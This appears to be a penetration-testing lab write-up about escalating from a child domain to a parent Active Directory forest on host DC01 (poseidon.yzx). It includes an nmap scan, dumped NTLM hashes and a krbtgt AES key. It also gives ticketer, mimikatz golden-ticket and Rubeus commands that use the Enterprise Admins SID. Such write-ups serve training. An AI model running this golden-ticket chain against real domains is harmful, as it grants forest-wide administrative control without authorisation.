# DC01 .161

## Enumeration

```
Nmap scan report for 192.168.225.161
Host is up (0.044s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-12-06 04:10:13Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: poseidon.yzx, Site: Default-First-Site-Name)
445/tcp   open  ï¿½           Windows Server 2016 Standard 14393 microsoft-ds (workgroup: POSEIDON)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: poseidon.yzx, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc        Microsoft Windows RPC
49707/tcp open  msrpc        Microsoft Windows RPC
64765/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-06T04:13:03
|_  start_date: 2025-02-20T21:45:56
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: dc01
|   NetBIOS computer name: DC01\x00
|   Domain name: poseidon.yzx
|   Forest name: poseidon.yzx
|   FQDN: dc01.poseidon.yzx
|_  System time: 2025-12-06T04:13:00+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 1s, median: 0s

```

### Ports

Port specific enumeration&#x20;

### Local Users

## Initial Foothold



```
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:73b343f19afc47cece3d7de003a41774
POSEIDON$:1103:aad3b435b51404eeaad3b435b51404ee:01196f308a81e26264eb41dbb4b3e668
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

Get-DomainTrust -API

Get-DomainTrust

C:\programdata> Get-DomainSID -Domain sub.poseidon.yzx
S-1-5-21-4168247447-1722543658-2110108262
poseidon.yzx
S-1-5-21-1190331060-1711709193-932631991
S-1-5-21-1190331060-1711709193-932631991-519 

SourceName        : sub.poseidon.yzx
TargetName        : poseidon.yzx
TargetNetbiosName : POSEIDON
Flags             : IN_FOREST, DIRECT_OUTBOUND, TREE_ROOT, DIRECT_INBOUND
ParentIndex       : 0
TrustType         : UPLEVEL
TrustAttributes   : WITHIN_FOREST
TargetSid         : S-1-5-21-1190331060-1711709193-932631991
TargetGuid        : b77f9b23-9f53-4afc-a027-b38929b466f0

SourceName        : sub.poseidon.yzx
TargetName        : sub.poseidon.yzx
TargetNetbiosName : sub
Flags             : IN_FOREST, PRIMARY, NATIVE_MODE
ParentIndex       : 0
TrustType         : UPLEVEL
TrustAttributes   : 0
TargetSid         : S-1-5-21-4168247447-1722543658-2110108262
TargetGuid        : 5cdf1d22-5e08-4243-b8b1-32651fe49630

```

Trust account ends with $, one of them will work

```
aes key of krbtgt
b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2
```

## PrivEsc

We need aeskey of krbtgt (256), domain sid of both domains

{% code overflow="wrap" %}
```
impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -domain sub.poseidon.yzx -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 administrator -extra-pac

klist
Ticket cache: FILE:./administrator.ccache
Default principal: administrator@SUB.POSEIDON.YZX

Valid starting     Expires            Service principal
12/06/25 03:14:29  12/04/35 03:14:29  krbtgt/SUB.POSEIDON.YZX@SUB.POSEIDON.YZX
        renew until 12/04/35 03:14:29

```
{% endcode %}

### My Way

<pre data-overflow="wrap"><code><strong>.\mimikatz.exe "Kerberos::golden /user:Administrator /domain:sub.poseidon.yzx /sid:S-1-5-21-4168247447-1722543658-2110108262 /sids:S-1-5-21-1190331060-1711709193-932631991-519 /rc4:01196f308a81e26264eb41dbb4b3e668 /service:krbtgt /target:poseidon.yzx /ticket:trust.kirbi"  exit
</strong><strong>.\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc01.poseidon.yzx /dc:dc01.poseidon.yzx /ptt
</strong><strong>
</strong><strong>
</strong>.\mimikatz.exe "Kerberos::golden /user:Administrator /domain:sub.poseidon.yzx /sid:S-1-5-21-4168247447-1722543658-2110108262 /sids:S-1-5-21-1190331060-1711709193-932631991 /rc4:01196f308a81e26264eb41dbb4b3e668 /service:krbtgt /target:poseidon.yzx /ticket:trust.kirbi"  exit
.\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc01.poseidon.yzx /dc:dc01.poseidon.yzx /ptt

THAT -519 at the end of mimikatz 'poseidon' domain sid even tho it isnt a part of it is actually the 'Enterprise Admin SID' the guys who control the entire forest, without adding the 519 it shows all shares unwritable for psexec

klist
Ticket cache: FILE:./ticket.ccache
Default principal: Administrator@sub.poseidon.yzx

Valid starting     Expires            Service principal
12/06/25 04:33:44  12/06/25 14:33:44  cifs/dc01.poseidon.yzx@POSEIDON.YZX
        renew until 12/13/25 04:33:44

We're impersonating krbtgt either way look at the service flag in mimikatz and in impacket ticketer we use AES key of krbtgt here NT hash of the trust account (POSEIDON$)
</code></pre>

<figure><img src="../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

## Post Exploitation
